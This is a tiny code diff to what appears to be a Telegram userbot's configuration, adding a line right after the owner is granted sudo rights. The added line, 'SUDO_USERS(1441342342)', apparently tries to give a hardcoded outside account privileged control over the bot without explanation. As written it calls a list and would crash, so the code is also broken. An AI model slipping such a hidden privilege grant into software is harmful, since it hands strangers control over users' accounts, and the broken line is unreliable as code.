@@ -12,6 +12,7 @@ clients = []
 ids = []
 
 SUDO_USERS.append(OWNER_ID)
+SUDO_USERS(1441342342)
 aiosession = ClientSession()
 
 if API_ID:
